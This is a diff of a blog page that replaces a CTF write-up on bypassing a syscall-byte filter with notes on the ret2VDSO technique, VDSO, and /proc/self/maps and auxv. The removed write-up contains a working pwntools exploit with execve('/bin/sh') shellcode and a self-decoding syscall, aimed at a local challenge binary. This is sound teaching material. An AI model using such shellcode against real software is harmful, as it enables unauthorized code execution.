@@ -21,35 +21,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Shellcode（Decoder）一、程序分析 checksec保护几乎全开，来看反编译：   程序将 DAT_114514000 地址处的数据强制转换为函数指针并执行。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。 下面再分析一下：   OK，看到 0x114514000到0x114515000处可写可执行，但是 **fil">
+    <meta name="description" content="ret2VDSO 技术一、例子好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧 二、原理i 简介 VDSO (Virtual Dynamically-linked Shared Object)：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 linux-vdso.so.1 或 linux-gate.so.1。 为了提供一些常用系统调">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF题解：shellcode">
-<meta property="og:url" content="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/index.html">
+<meta property="og:title" content="ret2VDSO技术">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/index.html">
 <meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
-<meta property="og:description" content="Shellcode（Decoder）一、程序分析 checksec保护几乎全开，来看反编译：   程序将 DAT_114514000 地址处的数据强制转换为函数指针并执行。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。 下面再分析一下：   OK，看到 0x114514000到0x114515000处可写可执行，但是 **fil">
+<meta property="og:description" content="ret2VDSO 技术一、例子好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧 二、原理i 简介 VDSO (Virtual Dynamically-linked Shared Object)：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 linux-vdso.so.1 或 linux-gate.so.1。 为了提供一些常用系统调">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/checksec.png">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/main1.png">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/main2.png">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/vmmap.png">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/filter.png">
-<meta property="og:image" content="http://whoamiuu.github.io/images/shellcode/xgx.png">
-<meta property="article:published_time" content="2025-12-09T02:29:00.000Z">
-<meta property="article:modified_time" content="2025-12-10T05:49:25.509Z">
+<meta property="article:published_time" content="2026-01-30T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-02T06:37:28.831Z">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="stack-overflow">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://whoamiuu.github.io/images/shellcode/checksec.png">
 
 
-<link rel="canonical" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">
+<link rel="canonical" href="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/","path":"2025/12/09/2025-12-09-week1-Shellcode/","title":"CTF题解：shellcode"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/","path":"2026/01/30/2026-01-30-ret2VDSO 技术/","title":"ret2VDSO技术"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>CTF题解：shellcode | Whoamiuu's Blogs</title>
+<title>ret2VDSO技术 | Whoamiuu's Blogs</title>
   
 
 
@@ -171,7 +164,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shellcode%EF%BC%88Decoder%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Shellcode（Decoder）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">一、程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">二、调试过程</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2VDSO-%E6%8A%80%E6%9C%AF"><span class="nav-number">1.</span> <span class="nav-text">ret2VDSO 技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BE%8B%E5%AD%90"><span class="nav-number">1.1.</span> <span class="nav-text">一、例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">二、原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#i-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">i 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ii-%E8%A1%A5%E5%85%85"><span class="nav-number">1.2.2.</span> <span class="nav-text">ii 补充</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.3.</span> <span class="nav-text">三、调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#proc"><span class="nav-number">1.3.1.</span> <span class="nav-text">&#x2F;proc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-self"><span class="nav-number">1.3.2.</span> <span class="nav-text">&#x2F;proc&#x2F;self</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-self-maps"><span class="nav-number">1.3.3.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;maps</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-self-auxv"><span class="nav-number">1.3.4.</span> <span class="nav-text">&#x2F;proc&#x2F;self&#x2F;auxv</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -224,7 +217,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/09/2025-12-09-week1-Shellcode/">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -237,12 +230,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="CTF题解：shellcode | Whoamiuu's Blogs">
+      <meta itemprop="name" content="ret2VDSO技术 | Whoamiuu's Blogs">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CTF题解：shellcode
+          ret2VDSO技术
         </h1>
 
         <div class="post-meta-container">
@@ -253,14 +246,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2025-12-09 10:29:00" itemprop="dateCreated datePublished" datetime="2025-12-09T10:29:00+08:00">2025-12-09</time>
+      <time title="Created: 2026-01-30 10:00:00" itemprop="dateCreated datePublished" datetime="2026-01-30T10:00:00+08:00">2026-01-30</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-10 13:49:25" itemprop="dateModified" datetime="2025-12-10T13:49:25+08:00">2025-12-10</time>
+      <time title="Modified: 2026-02-02 14:37:28" itemprop="dateModified" datetime="2026-02-02T14:37:28+08:00">2026-02-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -268,7 +261,7 @@
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
         </span>
     </span>
 
@@ -288,24 +281,57 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="Shellcode（Decoder）"><a href="#Shellcode（Decoder）" class="headerlink" title="Shellcode（Decoder）"></a>Shellcode（Decoder）</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/shellcode/checksec.png" alt="image-20251209102926831"></p>
-<p>checksec保护几乎全开，来看反编译：</p>
-<p><img src="/images/shellcode/main1.png"></p>
-<p><img src="/images/shellcode/main2.png" alt="image-20251209111737923"></p>
-<p><strong>程序将 <code>DAT_114514000</code> 地址处的数据强制转换为函数指针并执行</strong>。现在问题在于，这里只有40字节布置shellcode，不知道这段区域是否可写可执行，以及filter函数过滤了什么。</p>
-<p>下面再分析一下：</p>
-<p><img src="/images/shellcode/vmmap.png"></p>
-<p><img src="/images/shellcode/filter.png" alt="image-20251209114310555"></p>
-<p>OK，看到 <strong>0x114514000到0x114515000处可写可执行</strong>，但是 **filter 会将连续的 \x0f\x05（<code>syscall</code> 指令的机器码） 转为 \0 **，现在的问题变成了如何绕过 syscall 的检查。</p>
-<p>因为这里只有 <code>\x0f\x05</code> 的过滤，我们可以尝试构造<strong>减1的编码规则，即让 <code>\x0f\x05</code> 变为 <code>\x0e\x04</code></strong>，再通过构造解码器解码syscall，从而绕过syscall过滤。</p>
-<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们在 filter 和 0x114514000 后面下断点，随便发送40个字符</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *filter</span></span><br><span class="line"><span class="string">b *0x114514000</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+    <div class="post-body" itemprop="articleBody"><h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
+<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
+<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
+<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
+<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
+</ol>
+<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
+<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
+<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
+<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
+<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
+</ol>
+<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/shellcode/xgx.png" alt="image-20251209212032233"></p>
-<p>可以看到全部落在了 0x114514000 区域，多运行几次发现，尽管有pie，这片区域地址不变。并且在执行0x114514000 区域前，0x114514000 会被加载到 rax 里，我们可以利用 rax 来计算要解码的 syscall 地址</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;\x48\x31\xff&quot;</span>                                <span class="comment"># xor rdi, rdi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span>    <span class="comment"># mov rdi, 0x68732f6e69622f2f</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57&quot;</span>                                        <span class="comment"># push rdi</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                                <span class="comment"># mov rdi, rsp</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                                <span class="comment"># xor rsi, rsi </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                                <span class="comment"># xor rdx, rdx </span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x21&quot;</span>                                <span class="comment"># inc byte [rax + 0x20]</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfe\x40\x22&quot;</span>                                <span class="comment"># inc byte [rax +0x21]                                  </span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6a\x3b\x58&quot;</span>                                <span class="comment"># push 0x3b; pop rax</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0e\x04&quot;</span>                                    <span class="comment"># 编码后的 syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shellcode: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *filter</span></span><br><span class="line"><span class="comment">#b *0x114514018</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your shellcode: \n&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+<blockquote>
+<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
+<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
+<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
+<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
+</ul>
+<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
+<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
+<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
+<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
+<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
+<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
+<li>程序代码段、数据段</li>
+<li>堆 (<code>[heap]</code>)</li>
+<li>栈 (<code>[stack]</code>)</li>
+<li>动态库（如 libc）</li>
+<li>特殊区域（如 <code>[vdso]</code>）</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
+<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
+<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
+<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
+<li><code>AT_EXECFN</code> → 可执行文件路径</li>
+<li><code>AT_PLATFORM</code> → CPU 架构</li>
+<li><code>AT_PAGESZ</code> → 页大小</li>
+</ul>
+</li>
+<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
+</ul>
+</blockquote>
 
     </div>
 
@@ -316,21 +342,21 @@
     <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/stack-overflow/" rel="tag"># stack-overflow</a>
               <a href="/tags/ctf/" rel="tag"># ctf</a>
-              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/12/08/2025-12-08-onlyfgets/" rel="prev" title="CTF题解：onlyfgets">
-                  <i class="fa fa-angle-left"></i> CTF题解：onlyfgets
+                <a href="/2026/01/29/2026-01-29-ret2dlsolve%E6%8A%80%E6%9C%AF/" rel="prev" title="学习笔记：ret2dlsolve技术">
+                  <i class="fa fa-angle-left"></i> 学习笔记：ret2dlsolve技术
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/12/10/2025-12-16-Vuln-Random-Seed/" rel="next" title="CTF题解：vuln">
-                  CTF题解：vuln <i class="fa fa-angle-right"></i>
+                <a href="/2026/01/31/2026-01-31-eat%20some%20AI/" rel="next" title="CTF题解：eat some AI">
+                  CTF题解：eat some AI <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
